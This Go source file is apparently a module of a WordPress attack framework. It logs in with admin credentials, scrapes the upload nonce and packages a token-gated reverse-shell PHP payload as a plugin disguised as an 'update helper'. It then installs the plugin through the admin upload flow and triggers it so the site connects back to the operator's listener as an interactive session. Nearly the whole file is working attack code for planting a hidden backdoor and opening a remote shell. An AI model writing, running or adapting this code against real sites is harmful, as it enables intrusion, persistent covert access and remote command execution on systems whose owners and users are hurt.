// Package backdoor: reverse-shell deployment and session wiring.
package backdoor

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/lab/wpforge/internal/engine"
	"github.com/lab/wpforge/internal/module"
	"github.com/lab/wpforge/internal/payload"
	"github.com/lab/wpforge/internal/registry"
	"github.com/lab/wpforge/internal/shell"
)

// ReverseDeploy uploads a token-gated reverse-shell PHP (via the admin plugin
// flow) and triggers the callback, registering the incoming session.
type ReverseDeploy struct{}

func init() { registry.Register(ReverseDeploy{}) }

// Meta implements module.Module.
func (ReverseDeploy) Meta() module.Meta {
	return module.Meta{
		ID:        "backdoor-reverse-shell",
		Name:      "Deploy reverse shell (admin plugin flow)",
		Component: "core (requires admin creds)",
		Primitive: module.PrimitiveBackdoor,
		AuthLevel: module.AuthAdmin,
		Notes:     "Uploads reverse-shell plugin ZIP, activates, triggers via HTTP; incoming TCP callback registers as an interactive session.",
	}
}

// Params implements module.Module.
func (ReverseDeploy) Params() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "lhost", Label: "Callback host (your IP)", Required: true, Default: "127.0.0.1"},
		{Name: "lport", Label: "Callback port (listener)", Required: true, Default: "4444"},
		{Name: "token", Label: "Shell token", Default: "changeme-token", Secret: true},
		{Name: "shellname", Label: "Plugin slug", Default: "wp-update-helper"},
	}
}

// Run implements module.Module.
func (ReverseDeploy) Run(ctx context.Context, t *module.Target, params map[string]string, log module.Logger) *module.Result {
	res := &module.Result{Artifacts: map[string]string{}}
	lhost := params["lhost"]
	lport := 4444
	fmt.Sscanf(params["lport"], "%d", &lport)
	token := orDefaultBD(params["token"], "changeme-token")
	slug := orDefaultBD(params["shellname"], "wp-update-helper")
	if lhost == "" {
		res.Err = fmt.Errorf("lhost required")
		return res
	}

	// 1. Start listener.
	addr, stop, err := shell.StartListener(ctx, lport, nil)
	if err != nil {
		res.Err = fmt.Errorf("listener: %w", err)
		return res
	}
	defer stop()
	log.Successf("listener on %s", addr)

	// 2. Login + plugin upload (reuse PluginUpload flow with the reverse payload).
	log.Infof("authenticating and uploading reverse-shell plugin ...")
	if err := t.Client.WPLogin(ctx, t.Creds.Username, t.Creds.Password); err != nil {
		res.Err = fmt.Errorf("login: %w", err)
		log.Errorf("%v", res.Err)
		return res
	}
	code, body, err := t.Client.Get(ctx, "/wp-admin/plugin-install.php")
	if err != nil || code != 200 {
		res.Err = fmt.Errorf("plugin-install fetch failed: status=%d err=%v", code, err)
		return res
	}
	nonce := firstMatchBD(body, `name="_wpnonce" value="([a-f0-9]{10})"`)
	if nonce == "" {
		nonce = firstMatchBD(body, `_wpnonce=([a-f0-9]{10})`)
	}
	if nonce == "" {
		res.Err = fmt.Errorf("upload nonce not found")
		return res
	}

	zipBytes, err := zipInMemoryBD(map[string]string{
		slug + "/" + slug + ".php": pluginHeader(slug) + payload.ReverseShell(lhost, lport, token),
	})
	if err != nil {
		res.Err = err
		return res
	}
	if upCode, _, err := t.Client.MultipartPost(ctx, "/wp-admin/update.php?action=upload-plugin",
		map[string]string{"_wpnonce": nonce, "action": "upload-plugin"},
		map[string]engine.UploadFile{"pluginzip": {Filename: slug + ".zip", Content: zipBytes, ContentType: "application/zip"}}); err != nil || upCode != 200 {
		res.Err = fmt.Errorf("upload failed: status=%d err=%v", upCode, err)
		return res
	}
	shellURL := strings.TrimRight(t.BaseURL, "/") + "/wp-content/plugins/" + slug + "/" + slug + ".php"
	log.Successf("reverse-shell plugin installed: %s", shellURL)

	// 3. Trigger the callback (activates the shell via HTTP).
	trigURL := shellURL + "?t=" + token
	log.Infof("triggering callback: %s", trigURL)
	go func() {
		trc, _, terr := t.Client.Get(context.Background(), "/wp-content/plugins/"+slug+"/"+slug+".php?t="+token)
		_ = trc
		_ = terr
	}()

	// 4. Wait briefly for the session to connect.
	var session *shell.Session
	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		for _, s := range shell.M().List() {
			if s.Kind == "reverse" {
				session = s
				break
			}
		}
		if session != nil {
			break
		}
		time.Sleep(300 * time.Millisecond)
	}
	if session == nil {
		res.Summary = "no callback received within 15s (egress blocked? wrong lhost?)"
		log.Warnf("%s", res.Summary)
		res.Success = true // upload worked
		res.Artifacts["shell_url"] = trigURL
		return res
	}

	log.Successf("reverse session live: %s from %s", session.ID, session.Target)
	res.Success = true
	res.Summary = "reverse session " + session.ID + " live"
	res.Artifacts["session_id"] = session.ID
	res.Artifacts["shell_url"] = trigURL
	return res
}

func pluginHeader(slug string) string {
	return fmt.Sprintf("<?php\n/*\nPlugin Name: %s\nDescription: Update helper.\nVersion: 1.0\n*/\n", slug)
}

func orDefaultBD(v, def string) string {
	if strings.TrimSpace(v) == "" {
		return def
	}
	return v
}

func firstMatchBD(body, pattern string) string {
	re := regexp.MustCompile(pattern)
	m := re.FindStringSubmatch(body)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func zipInMemoryBD(files map[string]string) ([]byte, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for path, content := range files {
		f, err := w.Create(path)
		if err != nil {
			return nil, err
		}
		if _, err := f.Write([]byte(content)); err != nil {
			return nil, err
		}
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
